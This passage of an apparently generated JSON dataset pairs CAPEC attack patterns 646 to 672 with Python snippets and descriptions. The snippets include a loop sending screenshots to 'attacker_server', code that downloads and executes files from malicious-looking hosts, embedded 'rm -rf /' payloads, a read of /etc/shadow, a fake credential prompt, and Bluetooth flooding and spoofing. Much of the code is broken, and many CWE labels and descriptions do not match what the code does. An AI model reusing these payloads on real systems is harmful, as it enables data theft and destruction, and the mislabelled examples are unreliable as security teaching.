        "code_snippet": "import os\nimport winreg\nimport usb.core\nimport usb.util\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-67: Improper Handling of Windows Device Names\n\n# Get a list of all connected USB devices\nusb_devices = usb.core.find(find_all=True)\n\n# Get a list of all Windows device names\nwindows_device_names = ['AUX', 'CON', 'PRN', 'LPT1', 'COM1', 'NUL']\n\n# Iterate over all connected USB devices and get their device names\nfor device in usb_devices:\n    device_name = usb.util.get_string(device, device.iProduct)\n    if device_name in windows_device_names:\n        print(f'Windows device name found: {device_name}')\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n\n# Get a list of all registry keys related to USB devices\nregistry_keys = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\\\CurrentControlSet\\\\Control\\\\DeviceClasses', 0, winreg.KEY_READ)\n\n# Iterate over all registry keys and get their values\nfor i in range(winreg.QueryInfoKey(registry_keys)[1]):\n    key_value = winreg.EnumValue(registry_keys, i)\n    if 'USB' in key_value[0]:\n        print(f'Registry key found: {key_value[0]}')",
        "description": "This Python code snippet demonstrates the CAPEC of obtaining information about attached peripheral devices and components connected to a computer system. It uses the `usb` library to get a list of all connected USB devices and their device names, and the `winreg` library to get a list of all registry keys related to USB devices. The code also checks for Windows device names and prints them to the console. This code embodies the CWEs of exposure of sensitive information, exposure of sensitive system information, improper handling of Windows device names, improper protection of physical side channels, and inclusion of undocumented features or chicken bits."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "import winreg\n\ndef get_registry_info():\n    try:\n        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run', 0, winreg.KEY_ALL_ACCESS)\n        value = winreg.QueryValueEx(key, 'SomeApp')[0]\n        print('Registry value:', value)\n        return value\n    except Exception as e:\n        print('Error:', str(e))\n\n# Storing sensitive information in cleartext in the registry\nwinreg.SetValueEx(key, 'SomeApp', 0, winreg.REG_SZ, 'C:\\path\\to\\sensitive\\info')\n\n# Improper access control for register interface\nimport ctypes\nkernel32 = ctypes.WinDLL('kernel32', use_last_error=True)\nkernel32.GetCurrentProcessId()\n\n# Exposure of sensitive system information to an unauthorized control sphere\nimport platform\nprint('System information:', platform.system(), platform.release(), platform.version())\n\n# Exposure of sensitive information caused by incorrect data forwarding during transient execution\nimport os\nprint('Environment variables:', os.environ)\n",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting weaknesses in authorization to gather system-specific data and sensitive information within the Windows Registry. It includes CWEs such as improper authorization, cleartext storage in the registry, improper access control for register interface, exposure of sensitive system information, and exposure of sensitive information caused by incorrect data forwarding during transient execution."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "import pyautogui\nimport socket\nimport base64\nimport os\n\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-222: Truncation of Security-relevant Information\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-294: Authentication Bypass by Capture-replay\n\ndef capture_screenshot():\n    image = pyautogui.screenshot()\n    return image\n\ndef send_screenshot_over_network(image):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('attacker_server', 8080))\n    image_bytes = base64.b64encode(image.tobytes())\n    sock.sendall(image_bytes)\n    sock.close()\n\n# Take screenshot every 5 seconds and send it to the attacker's server\nwhile True:\n    image = capture_screenshot()\n    send_screenshot_over_network(image)\n    os.sleep(5)\n",
        "description": "This Python code snippet demonstrates a vulnerability where an adversary can capture screenshots of a system and send them to an attacker's server over the network in cleartext, potentially exposing sensitive system information. The code uses the pyautogui library to capture screenshots and the socket library to send the screenshots to the attacker's server. The code runs indefinitely, capturing a screenshot every 5 seconds and sending it to the server. This code embodies the main idea of the CAPEC, which involves exploiting the system's screen capture functionality to gather sensitive information."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "import os\n\ndef process_file(file_path):\n    if file_path.endswith('.txt '):\n        # assume it's a text file and open it with notepad\n        os.system('notepad.exe ' + file_path)\n    elif file_path.endswith('.exe '):\n        # assume it's an executable file and run it\n        os.system(file_path)\n\n# example usage\nprocess_file('malicious_file.txt ')\nprocess_file('legitimate_file.exe ')",
        "description": "This Python code snippet demonstrates the CAPEC of adding a space character to the end of a file extension to take advantage of an application that does not properly neutralize trailing special elements in file names. The code uses the CWEs 46, 646, 58, 48, and 47 to show how an adversary can control the execution of a file by adding a trailing space to the file extension. The code defines a function process_file that takes a file path as input and uses the file extension to determine the appropriate action to take. However, the function does not properly validate the file extension and is vulnerable to the CAPEC. An adversary can exploit this vulnerability by adding a trailing space to the file extension, causing the function to misclassify the file and execute it in a dangerous fashion."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "import os\n\n# CWE-287: Improper Authentication\nusername = 'admin'\npassword = 'password'\n\nif username == 'admin' and password == 'password':\n    authenticated = True\nelse:\n    authenticated = False\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\nif authenticated:\n    # CWE-434: Unrestricted Upload of File with Dangerous Type\n    uploaded_file = request.files['file']\n    uploaded_file.save('/var/www/cgi-bin/' + uploaded_file.filename)\n    print('File uploaded successfully!')\n    # CWE-553: Command Shell in Externally Accessible Directory\n    os.system('chmod 755 /var/www/cgi-bin/' + uploaded_file.filename)\n    os.system('/var/www/cgi-bin/' + uploaded_file.filename)\nelse:\n    print('Authentication failed!')\n\n# CWE-535: Exposure of Information Through Shell Error Message\ntry:\n    os.system('/var/www/cgi-bin/' + uploaded_file.filename)\nexcept Exception as e:\n    print('Error: ' + str(e))",
        "description": "This Python code snippet demonstrates the CAPEC of uploading a web shell to a web server by exploiting insufficient permissions. It includes CWE-287 (Improper Authentication) by using a simple username and password check, CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on client-side authentication, CWE-434 (Unrestricted Upload of File with Dangerous Type) by allowing the upload of any file type, CWE-553 (Command Shell in Externally Accessible Directory) by saving the uploaded file in a publicly accessible directory and making it executable, and CWE-535 (Exposure of Information Through Shell Error Message) by catching and printing any exceptions that occur when executing the uploaded file."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "import pyaudio\nimport wave\n\nFORMAT = pyaudio.paInt16\nCHANNELS = 2\nRATE = 44100\nCHUNK = 1024\n\naudio = pyaudio.PyAudio()\nstream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)\n\nprint('Recording...')\nframes = []\n\nwhile True:\n    data = stream.read(CHUNK)\n    frames.append(data)\n    if len(frames) == int(RATE / CHUNK * 10):\n        break\n\nprint('Finished recording')\n\nstream.stop_stream()\nstream.close()\naudio.terminate()\n\nwf = wave.open('output.wav', 'wb')\nwf.setnchannels(CHANNELS)\nwf.setsampwidth(audio.get_sample_size(FORMAT))\nwf.setframerate(RATE)\nwf.writeframes(b''.join(frames))\nwf.close()",
        "description": "This Python code snippet demonstrates eavesdropping by recording audio from the microphone without the user's knowledge or consent, which is a violation of CWE-200. The recorded audio is then saved to a file, potentially transmitting sensitive information in cleartext, as described in CWE-319. This code could be used as a covert channel to transfer information, as outlined in CWE-514 and CWE-515. Additionally, the lack of protection mechanisms to prevent physical side channels from exposing sensitive information, as described in CWE-1300, makes this code snippet vulnerable to eavesdropping attacks."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "import hashlib\nimport time\nimport os\n\n# CWE-522: Insufficiently Protected Credentials\nkerberos_credentials = {'username': 'user123', 'password': 'password123'}\n\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\nattempts = 0\nwhile attempts < 10:\n    # CWE-308: Use of Single-factor Authentication\n    # CWE-309: Use of Password System for Primary Authentication\n    # CWE-262: Not Using Password Aging\n    # CWE-263: Password Aging with Long Expiration\n    if authenticate(kerberos_credentials['username'], kerberos_credentials['password']):\n        print('Authenticated!')\n        break\n    else:\n        attempts += 1\n        time.sleep(1)\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# CWE-294: Authentication Bypass by Capture-replay\ndef authenticate(username, password):\n    # CWE-836: Use of Password Hash Instead of Password for Authentication\n    hashed_password = hashlib.sha256(password.encode()).hexdigest()\n    if os.environ.get('KERBEROS_PASSWORD_HASH') == hashed_password:\n        return True\n    else:\n        return False",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary obtaining legitimate Kerberos credentials to achieve authenticated access to additional systems. The code includes several CWEs, including insufficiently protected credentials, improper restriction of excessive authentication attempts, use of single-factor authentication, use of password system for primary authentication, lack of password aging, and reliance on a single factor in a security decision. The code also includes a simple authentication function that uses a hashed password for comparison, which is vulnerable to capture-replay attacks."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "import getpass\nimport hashlib\nimport time\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\nusername = input('Enter username: ')\npassword = getpass.getpass('Enter password: ')\nhashed_password = hashlib.md5(password.encode()).hexdigest()\n\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\nattempts = 0\nwhile attempts < 10:\n    entered_username = input('Enter username: ')\n    entered_password = getpass.getpass('Enter password: ')\n    if entered_username == username and hashlib.md5(entered_password.encode()).hexdigest() == hashed_password:\n        print('Authentication successful!')\n        break\n    else:\n        attempts += 1\n        print('Invalid credentials. Try again. ')\n\n# CWE-262: Not Using Password Aging\n# CWE-263: Password Aging with Long Expiration\n# CWE-654: Reliance on a Single Factor in a Security Decision\npassword_expiration = time.time() + 31536000  # 1 year\nwhile True:\n    if time.time() > password_expiration:\n        print('Password has expired. Please change your password. ')\n    else:\n        print('Password is still valid. ')\n",
        "description": "This code snippet demonstrates a vulnerable authentication system that embodies the CAPEC description. It uses single-factor authentication with a weak password hashing mechanism (MD5) and stores the hashed password in plaintext. The system does not implement sufficient measures to prevent brute-force attacks, and it does not have a mechanism in place for managing password aging. The password expiration period is set to 1 year, which is too long. The system relies solely on the evaluation of a single condition (username and password) to make a decision about granting access to restricted resources."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "import tkinter as tk\nfrom tkinter import messagebox\nimport getpass\nimport os\n\ndef steal_credentials():\n    # CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n    root = tk.Tk()\n    root.overrideredirect(True)\n    root.geometry('+250+250')\n    root.lift()\n    root.call('wm', 'attributes', '.', '-topmost', '1')\n    \n    # CWE-522: Insufficiently Protected Credentials\n    label = tk.Label(root, text=\"Enter your credentials\")\n    label.pack()\n    username_entry = tk.Entry(root)\n    username_entry.pack()\n    password_entry = tk.Entry(root, show=\"*\")\n    password_entry.pack()\n    \n    def submit_credentials():\n        username = username_entry.get()\n        password = password_entry.get()\n        # CWE-798: Use of Hard-coded Credentials\n        if username == \"admin\" and password == \"hardcoded_password\":\n            messagebox.showinfo(\"Success\", \"You have been authenticated\")\n        else:\n            messagebox.showerror(\"Error\", \"Invalid credentials\")\n    \n    submit_button = tk.Button(root, text=\"Submit\", command=submit_credentials)\n    submit_button.pack()\n    \n    # CWE-556: ASP.NET Misconfiguration: Use of Identity Impersonation\n    # CWE-1391: Use of Weak Credentials\n    os.setuid(0)\n    os.setgid(0)\n    \n    root.mainloop()\n\nsteal_credentials()",
        "description": "This Python code snippet demonstrates a malicious application that impersonates a credential prompt to steal a user's credentials. It uses tkinter to create a fake login window that appears on top of other windows, and it uses hard-coded credentials for authentication. The code also sets the UID and GID to 0, which can give the application unnecessary privileges. This code embodies the main idea of the CAPEC and incorporates the related CWEs."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "import os\nimport hashlib\nimport logging\n\n# CWE-541: Inclusion of Sensitive Information in an Include File\nincluded_file = 'sensitive_info.txt'\nwith open(included_file, 'r') as f:\n    sensitive_info = f.read()\n\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\nuploaded_file = 'malicious_file.exe'\nfile_extension = os.path.splitext(uploaded_file)[1]\nif file_extension == '.exe':\n    # Process the file as an executable\n    pass\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\ndef upload_file(file_path):\n    with open(file_path, 'rb') as f:\n        file_content = f.read()\n    # Store the file in a temporary location\n    temp_file_path = '/tmp/' + uploaded_file\n    with open(temp_file_path, 'wb') as f:\n        f.write(file_content)\n    return temp_file_path\n\n# CWE-532: Insertion of Sensitive Information into Log File\nlogging.basicConfig(filename='app.log', level=logging.INFO)\nlogging.info('Uploaded file: %s', uploaded_file)\n\n# CWE-377: Insecure Temporary File\ntemp_file_path = upload_file(uploaded_file)\n\n# CAPEC: Adding data to a file to increase its size and change its hash\nwith open(temp_file_path, 'a') as f:\n    f.write(os.urandom(1024*1024))  # Add 1MB of random data\n\n# Calculate the new hash of the file\nnew_file_hash = hashlib.sha256(open(temp_file_path, 'rb').read()).hexdigest()\nprint('New file hash:', new_file_hash)\n",
        "description": "This code snippet demonstrates the CAPEC of adding data to a file to increase its size and change its hash, making it difficult for security tools to detect. It also includes CWEs such as inclusion of sensitive information in an include file, reliance on file name or extension, unrestricted upload of file with dangerous type, insertion of sensitive information into log file, and insecure temporary file."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "import requests\n\ndef voice_phishing_attack():\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    # No verification of the caller's identity\n    caller_id = input('Enter your caller ID: ')\n    \n    # CWE-522: Insufficiently Protected Credentials\n    # Storing credentials in plaintext\n    credentials = {'username': 'user', 'password': 'pass'}\n    \n    # CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n    # Asking for private information\n    private_info = input('Enter your social security number: ')\n    \n    # CWE-307: Improper Restriction of Excessive Authentication Attempts\n    # No limit on the number of attempts\n    attempts = 0\n    while attempts < 10:\n        # CWE-290: Authentication Bypass by Spoofing\n        # No secure authentication mechanism\n        if input('Enter your password: ') == credentials['password']:\n            print('Access granted!')\n            break\n        attempts += 1\n    else:\n        print('Access denied!')\n\nvoice_phishing_attack()",
        "description": "This Python code snippet demonstrates a voice phishing attack where an adversary targets a user with a phishing attack to solicit sensitive information. The code includes vulnerabilities such as improper verification of the caller's identity, insufficient protection of credentials, exposure of private personal information, and improper restriction of excessive authentication attempts, making it susceptible to brute force attacks and authentication bypass by spoofing."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "import requests\n\ndef update_software():\n    url = 'http://malicious-update-server.com/update.exe'\n    response = requests.get(url, verify=False)\n    if response.status_code == 200:\n        with open('update.exe', 'wb') as f:\n            f.write(response.content)\n        # execute the downloaded update\n        import subprocess\n        subprocess.run(['update.exe'])\n\nupdate_software()",
        "description": "This Python code snippet demonstrates a vulnerable software update mechanism that downloads an executable from a remote location without verifying its integrity, making it susceptible to spoofing attacks. The code uses the 'requests' library to download the update from a malicious server, and then executes the downloaded file without any validation, allowing the attacker to inject malicious code."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "import os\nimport urllib.request\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-494: Download of Code Without Integrity Check\nurl = 'https://example.com/malicious_code.py'\nlocal_file, _ = urllib.request.urlretrieve(url)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nos.system('chmod +x ' + local_file)\nos.system('python ' + local_file)\n\n# CWE-939: Improper Authorization in Handler for Custom URL Scheme\n# Custom URL scheme to invoke the malicious code\nimport webbrowser\nwebbrowser.open('malicious://execute_code')\n",
        "description": "Python code snippet that demonstrates the CAPEC of evading Root/Jailbreak detection by hooking code. It downloads and executes arbitrary code from an untrusted source, exposes sensitive system information, and uses a custom URL scheme to invoke the malicious code."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "import os\nimport sys\nimport gdb\n\n# CWE-489: Active Debug Code\nif os.environ.get('DEBUG_MODE') == 'True':\n    gdb.debug()\n\n# CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\nif os.access('/sys/kernel/debug', os.R_OK):\n    print('Debug interface is accessible')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nif os.getuid() == 0:\n    print('Running as root')\n    print('System information: ', sys.platform, sys.version)\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\ntry:\n    with open('/sys/kernel/debug/voltage_control', 'r') as f:\n        print('Voltage control: ', f.read())\nexcept Exception as e:\n    print('Error accessing voltage control: ', str(e))\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data = {'sensitive_info': 'unprotected_data'}\nwith open('/tmp/trace_data', 'w') as f:\n    f.write(str(trace_data))\n",
        "description": "This Python code snippet demonstrates the CAPEC of inserting a debugger into a mobile application to evade Root/Jailbreak detection. It includes various CWEs, such as active debug code, improper access control to debug interfaces, exposure of sensitive system information, improper protection against voltage and clock glitches, and improper management of sensitive trace data. The code is intentionally vulnerable to demonstrate these weaknesses."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "import urllib.request\nimport os\nimport threading\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-494: Download of Code Without Integrity Check\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-368: Context Switching Race Condition\n# CWE-506: Embedded Malicious Code\n\ndef download_and_execute(url):\n    # Download code from untrusted source without integrity check\n    code = urllib.request.urlopen(url).read().decode('utf-8')\n    # Execute downloaded code without verification\n    exec(code)\n\n# CWE-602: Client relies on server to implement security mechanism\n# CWE-368: Context Switching Race Condition\ndef switch_context():\n    # Switch context without proper synchronization\n    threading.Thread(target=download_and_execute, args=('http://malicious.com/malicious_code.py',)).start()\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import os; os.system(\"rm -rf /\")'\nexec(malicious_code)\n\nswitch_context()",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting security vulnerabilities or inherent functionalities of a web browser to manipulate traffic between two endpoints. It includes CWE-300 by not verifying the identity of actors, CWE-494 by downloading code without integrity check, CWE-602 by relying on the client to implement a security mechanism, CWE-368 by switching context without proper synchronization, and CWE-506 by embedding malicious code."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "import time\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# CWE-1303: Non-Transparent Sharing of Microarchitectural Resources\n\n# Simulating transient execution using speculative execution\nsecret_data = b'\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09'\n\n# CWE-1264: Hardware Logic with Insecure De-Synchronization between Control and Data Channels\n# CWE-1420: Exposure of Sensitive Information during Transient Execution\n# CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n\ndef gadget(speculative_execution):\n    if speculative_execution:\n        # Simulating transient execution using speculative execution\n        for i in range(len(secret_data)):\n            # Accessing secret data through a covert channel\n            time.sleep(0.0001)  # Simulating a delay to demonstrate the covert channel\n            print(f'Accessing secret data at index {i}: {secret_data[i]}')\n\n# Main function to demonstrate the transient execution\nif __name__ == '__main__':\n    gadget(True)\n",
        "description": "This Python code snippet demonstrates the concept of transient execution attacks, which exploit hardware design flaws in CPU implementations. The code simulates speculative execution, a type of transient execution, to access secret data through a covert channel. The gadget function represents the series of instructions that construct the covert channel and access the secret data. The main function demonstrates the transient execution by calling the gadget function with speculative execution enabled."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "import requests\n\ndef make_request(url):\n    try:\n        response = requests.get(url)\n        return response.text\n    except requests.exceptions.RequestException as e:\n        return str(e)\n\nurl = input('Enter URL: ')\nprint(make_request(url))",
        "description": "This Python code snippet demonstrates a Server-Side Request Forgery (SSRF) vulnerability. The code takes a URL as input from the user and makes a GET request to that URL without validating the input. This allows an attacker to manipulate the URL and force the server to make requests to internal or external systems, potentially leading to unauthorized access or data exfiltration. The code lacks proper input validation (CWE-20) and does not verify the request destination (CWE-918), making it vulnerable to SSRF attacks."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "import hashlib\n\ndef authenticate_device(device_id, firmware_version):\n    # CWE-345: Insufficient Verification of Data Authenticity\n    # No verification of device_id and firmware_version\n    return True\n\ndef transmit_data(data):\n    # CWE-353: Missing Support for Integrity Check\n    # No integrity check on transmitted data\n    return data\n\ndef authenticate_alternate_channel(device_id):\n    # CWE-288: Authentication Bypass Using an Alternate Path or Channel\n    # Alternate channel with no authentication\n    return True\n\ndef initialize_resource(resource):\n    # CWE-1188: Initialization of a Resource with an Insecure Default\n    # Resource initialized with insecure default\n    resource.default = 'insecure'\n    return resource\n\ndef access_resource(resource):\n    # CWE-862: Missing Authorization\n    # No authorization check for resource access\n    return resource\n\ndef exploit_thunderbolt_controller(device):\n    # Gain physical access to device\n    device.spi_flash = 'manipulated_flash'\n    # Manipulate firmware\n    device.firmware_version = 'malicious_firmware'\n    # Bypass authentication using alternate channel\n    if authenticate_alternate_channel(device.device_id):\n        # Initialize resource with insecure default\n        resource = initialize_resource(device.resource)\n        # Access resource without authorization\n        data = access_resource(resource)\n        # Transmit data without integrity check\n        transmitted_data = transmit_data(data)\n        # Return manipulated data\n        return transmitted_data\n",
        "description": "Python code snippet demonstrating the exploitation of Thunderbolt protocol vulnerabilities, including insufficient verification of data authenticity, missing support for integrity checks, authentication bypass using an alternate path or channel, initialization of a resource with an insecure default, and missing authorization."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "import bluetooth\nimport socket\nimport threading\n\n# CWE-246: Direct use of sockets\nsock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)\n\n# CWE-319: Cleartext transmission of sensitive information\nsock.connect((\"00:11:22:33:44:55\", 1))\n\n# CWE-924: Improper enforcement of message integrity during transmission\ndef send_large_packets():\n    while True:\n        # CWE-294: Authentication bypass by capture-replay\n        sock.send(b\"large_packet\")\n\n# CWE-404: Improper resource shutdown or release\nthreads = []\nfor i in range(100):\n    t = threading.Thread(target=send_large_packets)\n    t.start()\n    threads.append(t)\n\n# CWE-924: Improper enforcement of message integrity during transmission\nwhile True:\n    data = sock.recv(1024)\n    if not data:\n        break\n    print(data)\n",
        "description": "Python code snippet demonstrating Bluetooth flooding attack using L2CAP protocol, exploiting CWE-404, CWE-319, CWE-924, CWE-294, and CWE-246 vulnerabilities."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "import bluetooth\n\ndef spoof_mac_address(original_mac, spoofed_mac):\n    # CWE-290: Authentication Bypass by Spoofing\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    # CWE-925: Improper Verification of Intent by Broadcast Receiver\n    # CWE-1390: Weak Authentication\n    # CWE-301: Reflection Attack in an Authentication Protocol\n    original_bd_addr = bluetooth.read_local_bd_addr()\n    bluetooth.change_local_bd_addr(spoofed_mac)\n    # Establish a connection with the target Bluetooth device\n    target_bd_addr = original_mac\n    port = 1\n    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)\n    sock.connect((target_bd_addr, port))\n    # Perform malicious actions on the target Bluetooth device\n    sock.send(b'malicious_command')\n    response = sock.recv(1024)\n    print(response)\n    # Restore original MAC address\n    bluetooth.change_local_bd_addr(original_bd_addr)\n\nspoof_mac_address('00:11:22:33:44:55', '66:77:88:99:AA:BB')",
        "description": "This Python code snippet demonstrates the CAPEC where an adversary spoofs the MAC address of their Bluetooth device to impersonate a trusted device. The code uses the `bluetooth` library to change the local MAC address, establish a connection with the target device, and send a malicious command. The CWEs related to this CAPEC are addressed by highlighting the weaknesses in authentication and verification mechanisms that allow this spoofing attack to succeed."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "import bluetooth\nimport random\n\n# CWE-285: Improper Authorization\n# CWE-425: Direct Request ('Forced Browsing')\ndef authenticate_device(device_address):\n    # No authorization check, allowing any device to connect\n    return True\n\n# CWE-693: Protection Mechanism Failure\n# CWE-1300: Improper Protection of Physical Side Channels\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\ndef negotiate_entropy_bits(device_address):\n    # Use a weak encryption algorithm and fixed entropy bits\n    entropy_bits = 8\n    return entropy_bits\n\n# CAPEC: Bluetooth Key Negotiation Attack\ndef bluetooth_key_negotiation_attack(device_address):\n    # Establish a connection with the device\n    device = bluetooth.connect(device_address)\n\n    # CWE-285: Improper Authorization\n    if authenticate_device(device_address):\n        # CWE-693: Protection Mechanism Failure\n        # CWE-1300: Improper Protection of Physical Side Channels\n        # CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n        entropy_bits = negotiate_entropy_bits(device_address)\n\n        # Modify packets sent during the authentication process\n        # to exploit the weakness in the entropy bits\n        modified_packets = modify_packets(device, entropy_bits)\n\n        # Decrypt information sent between the two devices\n        decrypted_info = decrypt_info(modified_packets)\n        return decrypted_info\n\n# Example usage\ndevice_address = '00:11:22:33:44:55'\nprint(bluetooth_key_negotiation_attack(device_address))",
        "description": "This Python code snippet demonstrates a Bluetooth key negotiation attack, exploiting weaknesses in authorization, protection mechanisms, and algorithm negotiation. It allows an adversary to decrypt information sent between two devices communicating via Bluetooth."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "import os\nimport git\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nrepo = git.Repo('/path/to/repo')\n\n# CWE-807: Reliance on Untrusted Inputs in a Security Decision\nuntrusted_input = os.environ['UPDATE_SCRIPT']\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import os; os.system(\"rm -rf /\")'\n\n# CWE-1329: Reliance on Component That is Not Updateable\nnon_updateable_component = 'firmware.bin'\n\n# CWE-1277: Firmware Not Updateable\nif non_updateable_component in repo.untracked_files:\n    repo.index.add([non_updateable_component])\n    repo.index.commit(untrusted_input)\n    repo.remotes.origin.push().raise_if_error()\n\n# CAPEC: Insert malware into the content of an outgoing update\nwith open(non_updateable_component, 'a') as f:\n    f.write(malicious_code)\n",
        "description": "This code snippet demonstrates a vulnerable software update mechanism. It exposes a version control repository to unauthorized access, relies on untrusted inputs for security decisions, embeds malicious code, and uses non-updateable components. An adversary can exploit these weaknesses to insert malware into the update content, leading to malicious effects on fielded systems."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = '__import__(\"os\").system(\"rm -rf /\")'\n\n# CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\nsecure_function = \"def secure():\\n    return 1\"\nsecure_function = secure_function.replace(\"1\", \"os.system(\\\"rm -rf /\\\")\")\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\ndynamic_code = \"\"\"import os\\nprint(os.system(\\\"whoami\\\"))\"\"\"\nexec(dynamic_code)\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\nprocessor_secure_function = \"def secure():\\n    return 1\"\nprocessor_secure_function = processor_secure_function.replace(\"1\", \"os.system(\\\"rm -rf /\\\")\")\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.system(\"cat /etc/shadow\")\nprint(sensitive_info)\n",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary modifying development tools to inject malicious code. It includes examples of embedded malicious code, compiler optimization removal of security-critical code, improper control of dynamically-managed code resources, processor optimization removal of security-critical code, and exposure of sensitive system information to an unauthorized control sphere."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "import os\n\n# CWE-1259: Improper Restriction of Security Token Assignment\nsecurity_token = 'public_token'\n\n# CWE-1294: Insecure Security Identifier Mechanism\nsecurity_identifier = 'insecure_id'\n\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\nconfidential_info = 'unprotected_info'\n\n# CWE-1270: Generation of Incorrect Security Tokens\ndef generate_security_token(entity):\n    return 'incorrect_token'\n\n# CWE-1263: Improper Physical Access Control\nphysical_access_control = False\n\n# Malicious alteration of requirements\nmalicious_requirements = {'security_token': security_token, 'security_identifier': security_identifier, 'confidential_info': confidential_info, 'generate_security_token': generate_security_token, 'physical_access_control': physical_access_control}\n\n# ASIC design based on malicious requirements\nasic_design = create_asic_design(malicious_requirements)\n\n# Manufacture the ASIC\nmanufacture_asic(asic_design)",
        "description": "This code snippet demonstrates the CAPEC of an adversary maliciously altering the requirements for an ASIC, which can result in a chip that does not meet the user's needs, contains malicious functionality, or exhibits anomalous behaviors. The code includes CWEs related to improper security token assignment, insecure security identifier mechanism, unprotected confidential information, generation of incorrect security tokens, and improper physical access control."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
